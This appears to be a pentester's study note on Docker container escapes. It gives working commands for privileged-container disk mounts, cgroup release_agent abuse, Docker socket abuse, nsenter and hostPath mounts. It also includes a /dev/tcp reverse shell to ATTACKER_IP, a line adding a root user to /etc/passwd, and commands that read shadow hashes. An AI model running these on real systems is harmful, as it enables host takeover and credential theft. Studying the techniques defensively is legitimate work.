# 04.2 — Docker Misconfigurations and Escape Techniques

## What This Note Covers

The most impactful Docker misconfigurations and the step-by-step container escape techniques that exploit them — privileged containers, Docker socket abuse, cgroup release_agent, host networking, and capability-based escapes.

---

## Escape Technique 1: Privileged Container Escape

The `--privileged` flag gives a container nearly all Linux capabilities, disables seccomp, and removes AppArmor restrictions. The container can see all host devices.

### Detection (from inside the container)

```bash
# Check if privileged
cat /proc/self/status | grep CapEff
# Privileged: CapEff: 0000003fffffffff (all capabilities set)

# Alternative check
cat /proc/1/status | grep CapBnd

# Check for privileged mode via Docker inspect (from outside)
docker inspect CONTAINER_NAME --format='{{.HostConfig.Privileged}}'
# "true" → privileged

# Check device access (privileged containers see host devices)
ls /dev/
# Large list including /dev/sda, /dev/mem → privileged
```

### Escape Method: Mount Host Filesystem via Device

```bash
# Step 1: Find the host's root disk device
fdisk -l 2>/dev/null
ls /dev/sd* /dev/xvd* /dev/nvme* 2>/dev/null

# Step 2: Mount it
mkdir /mnt/host
mount /dev/sda1 /mnt/host  # adjust device as needed

# Step 3: chroot into the host
chroot /mnt/host /bin/bash

# You now have root shell on the host
id  # uid=0(root)
cat /etc/shadow
```

## Escape Technique 2: cgroup release_agent

This technique exploits the cgroup v1 `release_agent` file to execute a command on the host when all processes in a cgroup exit. Works in privileged containers and some other misconfigurations.

```bash
# Step 1: Find and mount a writable cgroup
# (already mounted in most privileged containers)
mount | grep cgroup
# Or mount it yourself:
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp

# Step 2: Create a new cgroup
mkdir /tmp/cgrp/x

# Step 3: Enable notify_on_release for this cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Step 4: Find the host path of the container's cgroup
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab 2>/dev/null || \
  cat /proc/self/mountinfo | grep 'cgroup' | head -1 | awk '{print $4}')

# Step 5: Write the release_agent pointing to a script on the host
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Step 6: Create the command payload
echo '#!/bin/sh' > /cmd
echo "id > $host_path/output" >> /cmd
chmod a+x /cmd

# Step 7: Trigger release by killing the cgroup process
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Step 8: Read the output (executed on the host)
cat /output
# uid=0(root) gid=0(root) groups=0(root)

# Practical payload — add a backdoor user or get a reverse shell
echo '#!/bin/sh' > /cmd
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

> [!danger] cgroup escape is highly reliable in privileged containers
> This technique has been reliable across many container runtime versions. Always try it in privileged containers — it works without needing host filesystem mount.

## Escape Technique 3: Docker Socket Abuse

If `/var/run/docker.sock` is mounted inside the container (extremely common in CI/CD, Jenkins, Docker-in-Docker setups):

```bash
# Step 1: Confirm socket is mounted
ls -la /var/run/docker.sock
# srw-rw---- 1 root docker → socket file exists

# Step 2: Verify you can talk to it
curl --unix-socket /var/run/docker.sock http://localhost/version

# Step 3: If Docker CLI is available
docker ps  # lists host containers

# Step 4: Create a privileged container with host filesystem
docker run -it --rm \
  -v /:/host \
  --privileged \
  --network host \
  alpine:latest chroot /host /bin/bash
# Root shell on host

# Alternative if only curl is available (Docker API directly):
# Create container
curl --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh"],
    "HostConfig": {
      "Binds": ["/:/mnt/host"],
      "Privileged": true
    },
    "AttachStdin": true,
    "AttachStdout": true,
    "AttachStderr": true,
    "Tty": true,
    "OpenStdin": true
  }'

# The response includes the container ID
# Start and attach to the container via API
```

## Escape Technique 4: Host Network Mode + Host PID

Containers launched with `--network host` share the host's network namespace. With `--pid host`, they share the host's PID namespace.

```bash
# Check if container uses host network
ip addr  # shows host network interfaces, not container's
# If you see eth0 with the host's IP → host network mode

docker inspect CONTAINER --format='{{.HostConfig.NetworkMode}}'
# "host" → host network mode

# With host PID namespace:
docker inspect CONTAINER --format='{{.HostConfig.PidMode}}'
# "host" → host PID mode

# With host PID: you can see and interact with all host processes
ps aux  # shows ALL host processes
ls /proc/1/  # host's init process

# Access host process memory/credentials
cat /proc/1/environ | tr '\0' '\n'  # host process environment variables
cat /proc/1/cmdline | tr '\0' ' '

# nsenter: enter host namespaces from container with PID access
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
# If this works → you're in the host's namespaces = host shell
```

## Escape Technique 5: CAP_SYS_ADMIN Capability

`CAP_SYS_ADMIN` is the most powerful Linux capability. With it, even a non-privileged container can escape.

```bash
# Check for SYS_ADMIN capability
capsh --print | grep sys_admin
# or
cat /proc/self/status | grep CapEff
# Decode with: capsh --decode=VALUE

# Escape via FUSE filesystem (mount a fake filesystem that reads host files)
# Step 1: Install fuse
apt-get install -y fuse 2>/dev/null || apk add fuse

# Step 2: Use sshfs or a custom FUSE to access host filesystem
# (complex — cgroup method easier if available)

# Simpler SYS_ADMIN escape via cgroup (same as Technique 2):
# CAP_SYS_ADMIN allows mounting cgroups → identical escape
```

## Escape Technique 6: Writable hostPath Volume

If the Kubernetes pod (or Docker container) mounts a sensitive host path:

```bash
# Common dangerous host path mounts:
# /etc → read/modify host's /etc/passwd, /etc/cron.d, /etc/sudoers
# /var/run → access to docker.sock
# /proc → host process information
# / → full host filesystem
# /root → host root home directory (SSH keys, credentials)
# /home → user SSH keys

# Check what's mounted
mount | grep -v "cgroup\|proc\|sys\|dev\|tmpfs"
df -h

# If /etc is mounted:
cat /host-etc/shadow  # host password hashes
echo "root:$(openssl passwd -1 newpassword):0:0:root:/root:/bin/bash" >> /host-etc/passwd
# Add a root user → SSH in from outside

# If /var/run is mounted and contains docker.sock:
ls /host-var-run/docker.sock
# → use Docker socket escape (Technique 3)
```

## Detection Summary — Are You in a Container?

```bash
# Check 1: /.dockerenv file
ls /.dockerenv
# Exists → likely in Docker container

# Check 2: cgroup indicates container
cat /proc/1/cgroup
# Contains "docker" or container ID → in container

# Check 3: Hostname is a container ID (12-char hex)
hostname
# e.g., a1b2c3d4e5f6 → container

# Check 4: Limited process list
ps aux
# Very few processes → isolated PID namespace → container

# Check 5: Overlay filesystem
mount | grep overlay
# Present → container using overlay filesystem
```

## Misconfiguration Quick Reference

| Misconfiguration | Detection | Escape Method |
|---|---|---|
| `--privileged` | `CapEff: full` / `inspect Privileged:true` | Device mount + chroot, cgroup release_agent |
| Docker socket mounted | `/var/run/docker.sock` exists in container | Docker socket abuse |
| Host network mode | `ip addr` shows host interfaces | Network sniffing, binding host ports |
| Host PID mode | `ps` shows host processes | `nsenter --target 1` |
| `CAP_SYS_ADMIN` | `capsh --print` shows sys_admin | cgroup release_agent |
| Sensitive hostPath | `mount` shows /etc, /proc, / | Read/write host files, add users |
| Exposed TCP Docker API | `curl http://TARGET:2375/version` | Create privileged container remotely |
